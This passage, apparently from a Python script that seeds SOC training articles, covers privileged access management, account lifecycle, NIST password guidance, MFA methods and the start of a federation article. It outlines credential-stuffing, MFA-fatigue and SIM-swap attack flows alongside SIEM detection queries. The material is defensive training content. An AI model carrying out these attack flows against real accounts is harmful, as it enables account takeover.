| Live monitoring | SOC can watch privileged sessions in real-time |
| Metadata capture | Source IP, target, duration, commands executed |
| Searchable index | Find sessions by user, command, target, or time |

### Session Recording Architecture

```
Admin ---> PAM Jump Server (proxy) ---> Target System
                  |
                  +-- Records video stream
                  +-- Captures keystrokes
                  +-- Enforces command policies
                  +-- Injects rotated credentials (user never sees password)

Session metadata stored:
  - Who: user identity and their role
  - What: target system, account used
  - When: start time, duration, end time
  - How: protocol (RDP, SSH, HTTPS)
  - Commands: full transcript of session activity
```

## Credential Vaulting

Credential vaults securely store, manage, and rotate privileged passwords and keys.

| Capability | Description |
|------------|-------------|
| Encrypted storage | Passwords encrypted at rest with HSM-backed keys |
| Automatic rotation | Passwords changed on schedule or after each use |
| Check-out/check-in | Users request credentials, return them after use |
| One-time passwords | Each checkout gets a unique password |
| Discovery | Scan network for privileged accounts not yet managed |
| Emergency access | Break-glass procedures for critical situations |
| API integration | Applications retrieve secrets programmatically |

### Password Rotation Flow

```
Normal rotation cycle:
  1. PAM vault generates new complex password
  2. PAM connects to target system (AD, Linux, database)
  3. PAM changes the password on the target
  4. PAM verifies the new password works
  5. PAM stores the new password in encrypted vault
  6. Old password is invalidated

Frequency recommendations:
  - Domain admin accounts: After every use
  - Service accounts: Every 30-90 days
  - Local admin accounts: Every 24 hours (LAPS)
  - Root accounts: After every use
  - Break-glass accounts: After every use
```

## Emergency Break-Glass Procedures

Break-glass accounts provide emergency access when normal PAM systems are unavailable.

```
Break-Glass Protocol:

PREPARATION:
  1. Create dedicated emergency accounts (e.g., "emergency-admin-01")
  2. Set complex passwords (30+ characters)
  3. Store credentials in physical safe + encrypted digital backup
  4. Accounts disabled by default, monitored for any enable/use
  5. Document procedures and authorized personnel

ACTIVATION (when PAM is down):
  1. Two authorized personnel required (dual control)
  2. Retrieve credentials from secure storage
  3. Enable the break-glass account
  4. Perform only the necessary emergency actions
  5. Document all actions taken with timestamps

DEACTIVATION (when crisis is resolved):
  1. Disable the break-glass account immediately
  2. Reset the password
  3. Return credentials to secure storage
  4. File incident report documenting usage
  5. Review all actions taken during break-glass period
  6. Update audit log and notify security leadership

Detection rules:
  Monitor for: break-glass account enable, login, or use
  Alert severity: CRITICAL
  Response: Immediate investigation to confirm authorized use
```

## PAM Tools Overview

| Tool | Type | Key Features |
|------|------|-------------|
| CyberArk PAS | Commercial | Industry leader, session recording, credential vault |
| BeyondTrust | Commercial | Endpoint privilege management, PAM |
| Delinea (Thycotic) | Commercial | Secret Server, privilege manager |
| HashiCorp Vault | Open/Commercial | Secrets management, dynamic credentials |
| Azure AD PIM | Cloud | JIT role activation for Azure/M365 |
| AWS IAM Access Analyzer | Cloud | Identify overprivileged IAM roles |
| Microsoft LAPS | Free | Local admin password rotation for Windows |

## SOC Analyst PAM Monitoring

```
Key alerts to configure:

1. Break-glass account activity (any login = critical alert)
2. Failed vault access attempts (credential theft attempt)
3. Privilege activation outside business hours
4. Session duration exceeding approved window
5. Blocked commands during privileged sessions
6. Password checkout without corresponding session
7. Multiple concurrent privileged sessions by same user
8. Privilege activation without manager approval
9. Service account used interactively
10. Credential rotation failures (passwords out of sync)
```

## Key Takeaways

- PAM is essential for controlling the blast radius of privileged account compromise
- JIT access eliminates standing privileges and reduces the attack window
- Session recording provides forensic evidence and deters insider threats
- Credential vaulting with automatic rotation prevents password reuse and theft
- Break-glass procedures must be documented, tested, and monitored
- SOC analysts should actively monitor PAM alerts as high-priority events
"""))

    # ---------------------------------------------------------------
    # Article 7: Account Lifecycle Management
    # ---------------------------------------------------------------
    articles.append(("Account Lifecycle Management", ["identity", "access-management", "account-lifecycle", "provisioning", "identity-governance", "access-review"], r"""# Account Lifecycle Management

## Overview

Account lifecycle management covers the entire lifespan of a user identity from creation to deletion. Properly managing this lifecycle is critical for security: orphaned accounts are backdoors, over-provisioned accounts increase breach impact, and inconsistent de-provisioning leaves data exposed. SOC analysts must understand the lifecycle to detect anomalies, investigate unauthorized access, and support access reviews.

## The Joiner-Mover-Leaver Process

| Phase | Trigger | Actions | Risk if Mishandled |
|-------|---------|---------|-------------------|
| Joiner | New hire, contractor start | Create account, assign baseline access, provision mailbox | Delayed onboarding, temp workarounds |
| Mover | Role change, transfer, promotion | Adjust access to match new role, revoke old access | Privilege creep, SoD violations |
| Leaver | Termination, contract end, retirement | Disable account, revoke all access, archive data | Orphaned account, unauthorized access |

### Joiner Process Detail

```
Joiner Workflow:

HR System (source of truth)
    |
    v
Identity Governance Platform
    |
    +-- Create AD account
    |     - Set department, manager, title attributes
    |     - Set password to random temporary value
    |     - Apply naming convention (first.last)
    |
    +-- Assign base access
    |     - Department security group
    |     - Standard applications (email, intranet, HR portal)
    |     - VPN group if remote worker
    |
    +-- Provision application accounts
    |     - SIEM read access (SOC analysts)
    |     - Ticketing system
    |     - Team collaboration tools
    |
    +-- Configure MFA
    |     - Enroll in MFA during first login
    |     - Require MFA registration within 7 days
    |
    +-- Notify
          - Manager: new account ready
          - IT: provision hardware
          - Security: new privileged user (if applicable)
```

### Mover Process Detail

```
Mover Workflow:

HR updates role/department in HRIS
    |
    v
Identity Governance Platform detects change
    |
    +-- Calculate access delta
    |     - New role required access (add)
    |     - Old role specific access (remove)
    |     - Common access (keep)
    |
    +-- Generate access change request
    |     - New manager approval for additions
    |     - Old manager confirmation for removals
    |
    +-- Execute approved changes
    |     - Add new security groups
    |     - Remove old security groups
    |     - Update application role assignments
    |     - Update AD attributes (department, title, manager)
    |
    +-- Verify
          - Confirm new access works
          - Confirm old access is actually removed
          - Update access certification records
```

### Leaver Process Detail

```
Leaver Workflow (Critical Path):

HR sets termination date
    |
    v
Termination date - 0 days (Day of termination):
    |
    +-- Disable AD account (do NOT delete yet)
    +-- Reset password to random value
    +-- Remove from all security groups
    +-- Revoke VPN/remote access
    +-- Disable email (set auto-reply, forward to manager)
    +-- Revoke OAuth tokens and active sessions
    +-- Disable MFA devices
    +-- Revoke cloud access (Azure, AWS, GCP)
    +-- Collect physical assets (badge, laptop, keys)
    |
Termination date + 30 days:
    +-- Archive mailbox per retention policy
    +-- Archive personal drive/files
    +-- Review for any access that was missed
    |
Termination date + 90 days:
    +-- Delete AD account
    +-- Remove from all systems
    +-- Final audit record

CRITICAL: For involuntary terminations (fired for cause):
  - Disable ALL access BEFORE the employee is notified
  - Coordinate with HR and legal on exact timing
  - Monitor for data exfiltration in days preceding termination
  - Preserve evidence if investigation is ongoing
```

## Orphaned and Dormant Accounts

### Orphaned Accounts

Orphaned accounts belong to users who have left the organization but whose accounts were not properly deactivated.

```powershell
# Find orphaned accounts — enabled but no recent logon
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter {Enabled -eq $true -and LastLogonTimestamp -lt $cutoff} `
  -Properties LastLogonTimestamp, Manager, Department |
  Select Name, SamAccountName, Department,
    @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}},
    @{N='Manager';E={if($_.Manager){(Get-ADUser $_.Manager).Name}else{"NONE"}}} |
  Sort LastLogon |
  Export-Csv C:\temp\orphaned_accounts.csv -NoTypeInformation

# Cross-reference with HR system
# Import active employee list and compare with AD accounts
$hrEmployees = Import-Csv C:\temp\active_employees.csv
$adUsers = Get-ADUser -Filter {Enabled -eq $true} -Properties EmployeeID
$orphaned = $adUsers | Where { $_.EmployeeID -notin $hrEmployees.EmployeeID }
```

### Dormant Account Detection

```powershell
# Find accounts that haven't logged in within 60 days
$threshold = (Get-Date).AddDays(-60).ToFileTime()
Get-ADUser -Filter {LastLogonTimestamp -lt $threshold -and Enabled -eq $true} `
  -Properties LastLogonTimestamp, whenCreated, Description |
  Select Name, SamAccountName, Description,
    @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}},
    @{N='Created';E={$_.whenCreated}} |
  Sort LastLogon

# Automated dormant account workflow:
# Day 60 no login -> Email manager for confirmation
# Day 75 no response -> Disable account, notify manager
# Day 90 still disabled -> Move to "Pending Delete" OU
# Day 180 -> Delete account
```

## Access Reviews (Certifications)

Regular access reviews ensure users only have the access they need.

| Review Type | Frequency | Scope | Reviewer |
|-------------|-----------|-------|----------|
| Manager review | Quarterly | Direct reports' access | People manager |
| Application owner review | Semi-annually | All users of an application | App owner |
| Privileged access review | Monthly | Admin/elevated access | Security team |
| Entitlement review | Annually | All entitlements system-wide | Governance team |
| SOD conflict review | Quarterly | Separation of duties violations | Compliance team |

### Access Review Process

```
Access Review Workflow:

1. INITIATE: Governance platform generates review campaign
   - Scope: All users in "SIEM-Admins" group
   - Reviewer: SOC Lead
   - Deadline: 14 days

2. REVIEW: Reviewer examines each user's access
   For each user, reviewer selects:
   - CERTIFY: User needs this access, keep it
   - REVOKE: User no longer needs this access, remove it
   - FLAG: Uncertain, escalate for investigation

3. REMEDIATE: Revoked access is automatically removed
   - AD group membership removed
   - Application permissions updated
   - Audit trail recorded

4. REPORT: Compliance report generated
   - Completion percentage
   - Actions taken (certify/revoke/flag counts)
   - Overdue reviews escalated to management
```

## Automation with Identity Governance

| Capability | Manual Process | Automated Process |
|------------|---------------|-------------------|
| Account creation | IT ticket, manual AD creation | HR event triggers automatic provisioning |
| Role assignment | Manager emails IT with access list | Role catalog auto-assigns based on job code |
| Access review | Spreadsheet circulated via email | Governance platform with workflow and reminders |
| Offboarding | IT disables account when notified | HR termination triggers immediate account disable |
| Compliance reporting | Manual audit, days of effort | Real-time dashboards and automated reports |
| SoD enforcement | Manual checking of role combinations | Policy engine blocks conflicting assignments |

### Identity Governance Tools

| Tool | Type | Key Features |
|------|------|-------------|
| SailPoint IdentityNow | Commercial | AI-driven access reviews, role mining, provisioning |
| Saviynt | Commercial | Cloud-native IGA, fine-grained entitlements |
| Microsoft Entra ID Governance | Cloud | Access reviews, entitlement management, lifecycle workflows |
| One Identity | Commercial | AD-focused identity governance |
| Omada | Commercial | Business process-oriented IGA |

## SOC Analyst Relevance

### Red Flags in Account Lifecycle

```
Indicators of concern:

1. Account active after employee termination date
   -> Check HR records vs account last-logon

2. Account created outside normal provisioning workflow
   -> No corresponding HR record or ticket

3. Account re-enabled after being disabled for dormancy
   -> Potential attacker re-activating abandoned account

4. Service account with interactive logon
   -> Service accounts should not log in as humans

5. Multiple accounts for same person
   -> Possible attempt to accumulate access

6. Account with no manager assigned
   -> Orphaned account or provisioning failure

7. Access granted without approval workflow
   -> Direct AD modification bypassing governance

8. Accounts in privileged groups with no recent certification
   -> Missed access review
```

### Investigation Queries

```
# Splunk — accounts active after termination
index=windows EventCode=4624
| lookup hr_terminations employee_id as TargetUserName OUTPUT term_date
| where isnotnull(term_date) AND _time > strptime(term_date, "%Y-%m-%d")
| table _time, TargetUserName, term_date, SourceIP, LogonType

# Splunk — accounts created outside business hours
index=windows EventCode=4720
| eval hour=strftime(_time, "%H")
| where hour < 7 OR hour > 19
| table _time, TargetUserName, SubjectUserName
```

## Key Takeaways

- The joiner-mover-leaver process must be automated to prevent security gaps
- Orphaned and dormant accounts are prime targets for attackers
- Regular access reviews are required for compliance and security hygiene
- Movers are the most commonly mishandled phase, causing privilege creep
- Involuntary terminations require coordinated, immediate access revocation
- SOC analysts should monitor for lifecycle anomalies as indicators of compromise
"""))

    # ---------------------------------------------------------------
    # Article 8: Password Policies and Credential Management
    # ---------------------------------------------------------------
    articles.append(("Password Policies and Credential Management", ["identity", "access-management", "passwords", "credential-management", "nist", "password-policy"], r"""# Password Policies and Credential Management

## Overview

Password policies govern how passwords are created, stored, rotated, and managed across an organization. Modern guidance from NIST has shifted dramatically from the traditional complexity-focused approach toward longer, user-friendly passwords with emphasis on breach detection. SOC analysts must understand current best practices to evaluate organizational posture, detect credential attacks, and guide remediation.

## NIST SP 800-63B Recommendations

NIST Special Publication 800-63B (Digital Identity Guidelines) fundamentally changed password guidance in 2017, with updates continuing through 2024.

### What NIST Recommends

| Recommendation | Details |
|---------------|---------|
| Minimum length | 8 characters (15+ for privileged accounts) |
| Maximum length | Allow at least 64 characters |
| No complexity rules | Do NOT require uppercase, lowercase, numbers, symbols |
| No periodic rotation | Do NOT force password changes on a schedule |
| Breach checking | Check passwords against known breached password databases |
| Allow paste | Allow paste into password fields (for password managers) |
| No hints | Do NOT allow password hints accessible to unauthenticated users |
| No security questions | Do NOT use knowledge-based authentication for recovery |
| Rate limiting | Throttle failed attempts (100 max before lockout) |
| Salt and hash | Use memory-hard hash (Argon2id, bcrypt, scrypt, PBKDF2) |

### Why No Forced Rotation?

```
Traditional approach (every 90 days):
  Password1! -> Password2! -> Password3! -> Password4!

Users respond to forced rotation by:
  - Incrementing a number
  - Changing a single character
  - Writing passwords on sticky notes
  - Reusing patterns across systems

NIST finding: Forced rotation leads to WEAKER passwords
  because users choose easily modifiable base passwords.

When to change passwords:
  - Evidence of compromise
  - Breach notification for the service
  - User suspects their password was exposed
  - Security incident involving credential theft
```

## Password Complexity vs Length

```
Entropy comparison (assuming random characters):

8-char complex (upper+lower+digit+symbol, ~95 chars):
  95^8 = 6.6 quadrillion combinations
  ~52.6 bits of entropy

16-char lowercase only (26 chars):
  26^16 = 43.6 sextillion combinations
  ~75.2 bits of entropy

20-char passphrase (2048 common words, 4 words):
  2048^4 = 17.6 trillion combinations
  ~44 bits, but with 5 words = ~55 bits

Conclusion: Length beats complexity every time
  "correct horse battery staple" > "P@$$w0rd"
```

### Password Strength Visual

| Password | Length | Estimated Crack Time (offline, 10B/sec) | Rating |
|----------|--------|----------------------------------------|--------|
| P@ssw0rd | 8 | < 1 second (in breach lists) | Terrible |
| Tr0ub4dor&3 | 11 | ~3 days | Weak |
| Summer2025! | 11 | < 1 second (common pattern) | Terrible |
| 7hG$kL9mP2 | 10 | ~20 hours | Moderate |
| correct-horse-battery-staple | 28 | ~centuries | Strong |
| dG8k#mNq$2Fp!xR7 | 17 | ~millions of years | Very strong |

## Password Managers

Password managers generate, store, and autofill unique, complex passwords for every service.

### Enterprise Password Manager Deployment

```
Recommended Architecture:

User Device
  +-- Password Manager Client (browser extension + desktop app)
  |     - Encrypted vault stored locally
  |     - Synced to central server (encrypted)
  |     - Master password + MFA to unlock
  |
  +-- Browser Integration
        - Auto-fill credentials on recognized sites
        - Generate random passwords on registration
        - Detect and warn about password reuse

Central Server (self-hosted or cloud)
  - Encrypted vault storage (zero-knowledge architecture)
  - Admin console for policy enforcement
  - Emergency access configuration
  - Audit logging of vault access
  - Directory integration (SCIM/AD sync)
```

### Enterprise Password Manager Comparison

| Feature | Bitwarden | 1Password Business | Keeper | LastPass |
|---------|-----------|-------------------|--------|----------|
| Self-hosted option | Yes | No | No | No |
| Zero-knowledge | Yes | Yes | Yes | Yes |
| SSO integration | Yes | Yes | Yes | Yes |
| Admin console | Yes | Yes | Yes | Yes |
| Breach monitoring | Yes | Yes (Watchtower) | Yes | Yes |
| Emergency access | Yes | Yes | Yes | Yes |
| CLI for automation | Yes | Yes | Yes | Limited |

## Credential Stuffing Defense

Credential stuffing uses stolen username/password pairs from data breaches to attempt login on other services.

```
Attack Flow:
  1. Attacker obtains breach dump (millions of email:password pairs)
  2. Automated tool tries each pair against target login page
  3. Due to password reuse, 0.5-2% of attempts typically succeed
  4. Attacker gains access to accounts on the target service

Detection Indicators:
  - High volume of failed logins from distributed IP addresses
  - Login attempts with valid usernames but wrong passwords
  - Success rate patterns (low but consistent)
  - Attempts from residential proxy networks or botnets
  - User-agent strings from automation tools

Defense Layers:
  1. Breached password detection (check on registration and login)
  2. Rate limiting per IP and per account
  3. CAPTCHA after failed attempts
  4. Bot detection (behavioral analysis)
  5. MFA requirement (renders stolen passwords insufficient)
  6. Device fingerprinting (flag new devices)
  7. Credential-less authentication (passkeys, FIDO2)
```

### Detecting Credential Stuffing in SIEM

```
# Splunk — credential stuffing detection
index=web_proxy sourcetype=access_combined action=login status=401
| stats count dc(username) as unique_users by src_ip
| where unique_users > 50 AND count > 100
| sort -count

# Splunk — successful logins from IPs with many failures
index=web_proxy sourcetype=access_combined action=login
| stats count(eval(status=401)) as failures
        count(eval(status=200)) as successes by src_ip
| where failures > 50 AND successes > 0
| eval success_rate = round(successes/(failures+successes)*100, 2)
| sort -successes
```

## Breached Password Detection

```
Implementation Options:

1. Have I Been Pwned (HIBP) API — k-anonymity model
   - Hash the password with SHA-1
   - Send first 5 characters of hash to API
   - API returns all hashes with that prefix
   - Check locally if full hash matches any result
   - Password NEVER leaves your system

   # Example: checking a password
   import hashlib, requests
   sha1 = hashlib.sha1(b"password123").hexdigest().upper()
   prefix, suffix = sha1[:5], sha1[5:]
   resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
   compromised = suffix in resp.text  # True = password is breached

2. Azure AD Password Protection
   - Deploys banned password list to domain controllers
   - Checks passwords at change time
   - Includes global banned list + custom organizational terms
   - Works with on-prem AD and Azure AD

3. Self-hosted hash database
   - Download HIBP password hash list (sorted by prevalence)
   - Import into internal service
   - Check during password set/change operations
```

## Passwordless Authentication

The future of authentication is moving beyond passwords entirely:

| Method | How It Works | Phishing Resistant |
|--------|-------------|-------------------|
| FIDO2/WebAuthn | Public key crypto with hardware authenticator | Yes |
| Windows Hello for Business | Biometric or PIN bound to TPM | Yes |
| Certificate-based auth | X.509 certificate on smart card or device | Yes |
| Magic links | One-time login URL sent to verified email | Partial |
| Push notifications | Approve login on registered mobile device | No (MFA fatigue) |
| Passkeys | FIDO2 credentials synced across devices | Yes |

### Passkey Authentication Flow

```
Registration:
  1. User visits site, chooses "Create passkey"
  2. Browser/OS prompts for biometric verification (fingerprint/face)
  3. Device generates asymmetric key pair
  4. Public key sent to server and stored with user account
  5. Private key stored in secure enclave on device (never leaves)

Authentication:
  1. User visits site, chooses "Sign in with passkey"
  2. Server sends challenge (random nonce)
  3. Device prompts for biometric verification
  4. Private key signs the challenge
  5. Server verifies signature with stored public key
  6. User authenticated — no password transmitted or stored

Advantages:
  - No passwords to steal, phish, or stuff
  - Phishing resistant (origin-bound)
  - No server-side password database to breach
  - Synced passkeys work across devices (iCloud, Google)
```

## GPO Password Policy Configuration

```powershell
# View current domain password policy
Get-ADDefaultDomainPasswordPolicy

# Recommended settings:
#   MinPasswordLength: 15  (for regular users, 20+ for admins)
#   PasswordHistoryCount: 24
#   ComplexityEnabled: False  (yes, NIST says turn this off)
#   MaxPasswordAge: 0 (never expire) or 365 days as compromise
#   MinPasswordAge: 1 day (prevent rapid cycling through history)
#   LockoutThreshold: 10
#   LockoutDuration: 00:15:00
#   LockoutObservationWindow: 00:15:00

# Fine-Grained Password Policies for privileged accounts
New-ADFineGrainedPasswordPolicy -Name "PrivilegedAccountPolicy" `
  -Precedence 10 `
  -MinPasswordLength 20 `
  -PasswordHistoryCount 24 `
  -LockoutThreshold 5 `
  -LockoutDuration "00:30:00" `
  -ComplexityEnabled $false

Add-ADFineGrainedPasswordPolicySubject -Identity "PrivilegedAccountPolicy" `
  -Subjects "Domain Admins","Enterprise Admins","Schema Admins"
```

## Key Takeaways

- NIST recommends length over complexity and no forced periodic rotation
- Check passwords against breach databases at creation and periodically
- Password managers are essential for managing unique credentials at scale
- Credential stuffing is a volume attack best stopped by MFA and breach detection
- Passwordless authentication (FIDO2/passkeys) eliminates the root cause of password attacks
- SOC analysts should monitor for credential stuffing patterns and breached credential usage
"""))

    # ---------------------------------------------------------------
    # Article 9: Multi-Factor Authentication Deep Dive
    # ---------------------------------------------------------------
    articles.append(("Multi-Factor Authentication Deep Dive", ["identity", "access-management", "mfa", "fido2", "webauthn", "totp", "authentication"], r"""# Multi-Factor Authentication Deep Dive

## Overview

Multi-Factor Authentication (MFA) requires users to present two or more independent verification factors before granting access. MFA is the single most effective control against credential-based attacks. Microsoft reports that MFA blocks 99.9% of automated account compromise attempts. However, not all MFA methods provide equal security, and attackers have developed techniques to bypass weaker implementations.

SOC analysts must understand MFA mechanisms to evaluate bypass attempts, investigate account compromise despite MFA being enabled, and recommend appropriate MFA methods based on risk.

## MFA Factors and Methods

| Factor Category | Methods | Strength |
|----------------|---------|----------|
| Something you know | Password, PIN, security questions | Lowest (phishable) |
| Something you have | Hardware token, phone, smart card | Medium-High |
| Something you are | Fingerprint, face, iris, voice | High |
| Somewhere you are | GPS location, network location | Supplementary only |
| Something you do | Typing pattern, behavioral biometrics | Supplementary only |

### Common MFA Method Comparison

| Method | Phishing Resistant | MFA Fatigue Risk | SIM Swap Risk | Offline Capable | User Friction |
|--------|-------------------|-----------------|---------------|-----------------|---------------|
| SMS OTP | No | No | Yes | No | Medium |
| Voice call | No | No | Yes | No | High |
| Email OTP | No | No | No | No | Medium |
| TOTP app | No | No | No | Yes | Low |
| Push notification | No | Yes | No | No | Low |
| FIDO2 hardware key | Yes | No | No | Yes | Low |
| Passkeys | Yes | No | No | Yes | Low |
| Smart card + PIN | Yes | No | No | Yes | Medium |

## TOTP vs HOTP

### TOTP (Time-Based One-Time Password)

```
TOTP Algorithm (RFC 6238):
  1. Shared secret established during enrollment
  2. Current time divided into 30-second intervals
  3. HMAC-SHA1(secret, time_interval) computed
  4. 6-digit code extracted via dynamic truncation
  5. Code valid for current interval (plus window for clock skew)

  Code = Truncate(HMAC-SHA1(shared_secret, floor(unix_time / 30)))

Properties:
  - Time-based: code changes every 30 seconds
  - No server state needed (server computes same code)
  - Tolerance window: typically accepts +/- 1 interval (90 seconds)
  - Used by: Google Authenticator, Microsoft Authenticator, Authy

Vulnerability:
  - Shared secret can be stolen (QR code, backup codes)
  - Real-time phishing proxies can capture and replay codes
  - Clock synchronization issues cause failures
```

### HOTP (HMAC-Based One-Time Password)

```
HOTP Algorithm (RFC 4226):
  1. Shared secret and counter established during enrollment
  2. HMAC-SHA1(secret, counter) computed
  3. 6-digit code extracted
  4. Counter incremented on each use

  Code = Truncate(HMAC-SHA1(shared_secret, counter))

Properties:
  - Counter-based: code changes only when used
  - Server must track counter state per user
  - Code remains valid until used (no expiry)
  - Look-ahead window handles desync (server checks next N counters)
  - Used by: RSA SecurID, some hardware tokens

Risk:
  - Codes never expire until used — wider replay window
  - Counter desync requires resynchronization
```

## FIDO2 and WebAuthn

FIDO2 is the most secure widely available MFA standard, providing phishing-resistant authentication.

```
FIDO2 Architecture:

  +-- WebAuthn API (browser-side JavaScript API)
  |     Relying Party (website) communicates with authenticator
  |
  +-- CTAP2 (Client to Authenticator Protocol)
        Browser communicates with external authenticator
        (USB key, NFC, Bluetooth, platform authenticator)

Registration:
  1. Server sends challenge + relying party ID (origin)
  2. Authenticator generates new key pair for this origin
  3. Private key stored on authenticator (never leaves device)
  4. Public key + attestation sent to server
  5. Server stores public key with user account

Authentication:
  1. Server sends challenge + credential ID
  2. Browser verifies origin matches relying party ID
  3. Authenticator signs challenge with private key (after user verification)
  4. Server verifies signature with stored public key

Why phishing-resistant:
  - Origin binding: Key is bound to the exact domain (example.com)
  - If user visits evil-example.com, authenticator will NOT respond
  - Attacker cannot relay the challenge to a different origin
  - No shared secret to steal — asymmetric cryptography only
```

### FIDO2 Authenticator Types

| Type | Form Factor | Example | Pros | Cons |
|------|-------------|---------|------|------|
| Roaming | USB-A/C/NFC | YubiKey 5 | Cross-device, very secure | Easy to lose, cost per user |
| Platform | Built into device | Windows Hello, Touch ID | Convenient, no extra hardware | Device-bound, not portable |
| Hybrid | Phone as authenticator | Phone + BLE | Uses existing phone | Requires phone nearby |
| Synced passkey | Cloud-synced credential | iCloud Keychain, Google | Survives device loss | Key in cloud provider's custody |

## Push Notification MFA

```
Push MFA Flow:
  1. User enters username + password
  2. Server sends push notification to registered mobile app
  3. User opens notification, sees context (app name, location, time)
  4. User taps "Approve" or "Deny"
  5. Server receives approval, grants access

Advantages:
  - Very user-friendly (single tap)
  - Shows context (what app, from where)
  - No code to type

Risks:
  - MFA fatigue attacks (see below)
  - Device compromise = MFA bypass
  - Push notification can be intercepted by malware on device
```

## SMS OTP Risks

```
SMS is the weakest MFA method due to multiple attack vectors:

1. SIM Swapping
   - Attacker convinces carrier to transfer victim's number to new SIM
   - Attacker receives all SMS messages intended for victim
   - Social engineering or bribed carrier employees

2. SS7 Interception
   - Exploit vulnerabilities in SS7 telephony protocol
   - Intercept SMS in transit without victim's knowledge
   - Nation-state level capability, but commercial services exist

3. Real-time phishing
   - Attacker proxies login page
   - Victim enters password and SMS code on phishing site
   - Attacker immediately replays both to real site

4. Voicemail interception
   - If SMS fails, some services fall back to voice call
   - Attacker compromises voicemail to retrieve code

NIST SP 800-63B: SMS OTP is "RESTRICTED" authenticator
  - Acceptable only when risk is low
  - Service must offer alternative MFA method
  - Additional risk assessment required
```

## MFA Fatigue Attacks

MFA fatigue (also called MFA bombing or push spam) exploits push-notification MFA by sending repeated approval requests until the user accidentally or deliberately approves one.

```
MFA Fatigue Attack Flow:
  1. Attacker obtains valid username + password (phishing, breach, purchase)
  2. Attacker initiates login, triggering push notification to victim
  3. Victim denies the unexpected push
  4. Attacker immediately tries again... and again... and again
  5. After 20-50 pushes, user approves out of frustration or by mistake
  6. Attacker gains access

Real-world example: Uber breach (2022)
  - Attacker purchased credentials from dark web
  - Spammed MFA pushes to contractor's phone for over an hour
  - Contacted victim on WhatsApp pretending to be IT
  - Victim approved the push
  - Attacker gained access to internal systems

Detection:
  - Multiple MFA denials followed by a single approval
  - High volume of push requests outside business hours
  - MFA approval from unusual location/device
  - Multiple authentication attempts in short window

Countermeasures:
  - Number matching: User must type a number shown on login screen
  - Additional context: Show location, app name, IP address in push
  - Rate limiting: Block after 3 consecutive denied pushes
  - Lockout: Temporarily disable MFA after repeated denials
  - Upgrade to FIDO2: Eliminates push fatigue entirely
```

### Detecting MFA Fatigue in Logs

```
# Azure AD — MFA fatigue detection
SigninLogs
| where ResultType == 500121  // MFA denied
| summarize deny_count=count(), last_deny=max(TimeGenerated) by UserPrincipalName
| where deny_count > 5
| join kind=inner (
    SigninLogs
    | where ResultType == 0 AND AuthenticationRequirement == "multiFactorAuthentication"
    | project UserPrincipalName, approve_time=TimeGenerated, IPAddress
) on UserPrincipalName
| where approve_time > last_deny AND datetime_diff('minute', approve_time, last_deny) < 60
| project UserPrincipalName, deny_count, last_deny, approve_time, IPAddress

# Splunk — MFA fatigue
index=auth action=mfa_denied
| stats count as denials latest(_time) as last_denial by user
| where denials > 5
| join user [search index=auth action=mfa_approved
    | stats earliest(_time) as first_approval by user]
| where first_approval > last_denial
```

## Phishing-Resistant MFA Implementation

| Requirement | Implementation |
|------------|---------------|
| FIDO2 hardware keys | Require for privileged users, IT staff, executives |
| Platform authenticators | Windows Hello for Business for all Windows users |
| Passkeys | Enable for modern web applications |
| Ban SMS/voice | Disable SMS and voice OTP as MFA options |
| Number matching | Enable for all push notification MFA |
| Conditional access | Require phishing-resistant MFA for sensitive apps |
| Registration security | Require identity proofing for MFA enrollment |
| Recovery | Secure recovery process (not SMS-based) |

## Key Takeaways

- Not all MFA is equal: FIDO2/WebAuthn provides the strongest protection
- SMS OTP is the weakest common MFA method and should be phased out
- MFA fatigue is a growing attack vector, mitigated by number matching and FIDO2
- TOTP apps are a reasonable middle ground but remain vulnerable to real-time phishing
- SOC analysts should monitor for MFA bypass patterns and fatigue attacks
- The goal is phishing-resistant MFA for all users, starting with privileged accounts
"""))

    # ---------------------------------------------------------------
    # Article 10: Federation and Trust Relationships
    # ---------------------------------------------------------------
    articles.append(("Federation and Trust Relationships", ["identity", "access-management", "federation", "trust", "identity-provider", "saml", "oidc"], r"""# Federation and Trust Relationships

## Overview

Identity federation enables users authenticated by one organization (the identity provider) to access resources in another organization (the service provider) without creating separate accounts. Federation builds on trust relationships between organizations, allowing seamless cross-boundary authentication while maintaining each organization's control over its own identities.

SOC analysts encounter federation in B2B partner access, cloud service integration, mergers and acquisitions, and cross-domain SSO. Understanding federation is critical for assessing the security implications of trust relationships and investigating cross-organizational attack paths.

## Core Federation Concepts

| Concept | Definition | Example |
|---------|-----------|---------|
| Identity Provider (IdP) | Organization that authenticates users and issues identity assertions | Contoso's Azure AD |
| Service Provider (SP) | Organization that relies on the IdP for authentication | SaaS application (Salesforce) |
| Circle of Trust | Set of organizations that agree to trust each other's assertions | Contoso trusts Fabrikam for partner portal |
| Trust Agreement | Formal agreement defining federation terms | Metadata exchange, attribute mapping, policies |
| Assertion | Cryptographically signed statement about a user's identity | SAML assertion, OIDC id_token |
| Attribute Mapping | Translation of identity attributes between organizations | IdP "department" maps to SP "group" |

## How Federation Works

```
Organization A (IdP)                    Organization B (SP)
+-----------------+                     +-----------------+
| Users           |                     | Application     |
| Authentication  |                     | Authorization   |
| MFA             |                     | Access control  |
| Directory       |                     | Audit logging   |
+-----------------+                     +-----------------+
        |                                       |
        |   1. Trust established (metadata exchange)
        |<------------------------------------->|
        |                                       |
        |   2. User from Org A accesses Org B app
        |   3. Org B redirects user to Org A for auth
        |-------------------------------------->|
        |   4. User authenticates at Org A (their home IdP)
        |   5. Org A issues signed assertion to Org B
        |<------------------------------------->|
        |   6. Org B validates assertion, grants access
        |                                       |
        |   User NEVER creates account at Org B
        |   User credentials NEVER leave Org A
```

## Federation Protocols

### SAML Federation

```xml
<!-- IdP Metadata (shared with SP to establish trust) -->
<EntityDescriptor entityID="https://idp.contoso.com/saml">
  <IDPSSODescriptor>
    <KeyDescriptor use="signing">
      <KeyInfo>
        <X509Data>
          <X509Certificate>MIICxDCCAa... (IdP signing cert)</X509Certificate>
        </X509Data>
      </KeyInfo>
    </KeyDescriptor>
    <SingleSignOnService
      Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
      Location="https://idp.contoso.com/saml/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>

<!-- SP validates assertion signature using IdP's certificate -->
<!-- SP checks: issuer matches, audience matches, time is valid -->
```

### OIDC Federation

```
OIDC Discovery (OpenID Connect Discovery):

1. SP (Relying Party) fetches IdP configuration:
